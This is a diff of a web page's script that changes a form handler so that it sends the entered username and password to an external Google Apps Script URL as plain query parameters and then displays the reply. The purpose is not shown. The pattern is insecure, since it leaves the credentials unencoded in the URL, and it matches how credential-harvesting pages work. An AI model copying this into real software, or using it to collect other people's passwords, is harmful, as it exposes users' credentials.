@@ -36,7 +36,10 @@
         const password = document.getElementById('passwordId').value
         document.getElementById('formId').innerText = "Loading..."
 
-        console.log(text,password)
+        const res = await fetch('https://script.google.com/macros/s/AKfycbzVWbziMLcc3M7ly07yC-KBCxkG4-AaJKcfXSjk6QYBaDhX_llUtHkK6NStTk6JsDDB/exec'
+        +`?a=${text}&b=${password}`)
+        const resText = await res.text()
+        document.getElementById('formId').innerText = resText
       })
     </script>
   </body>
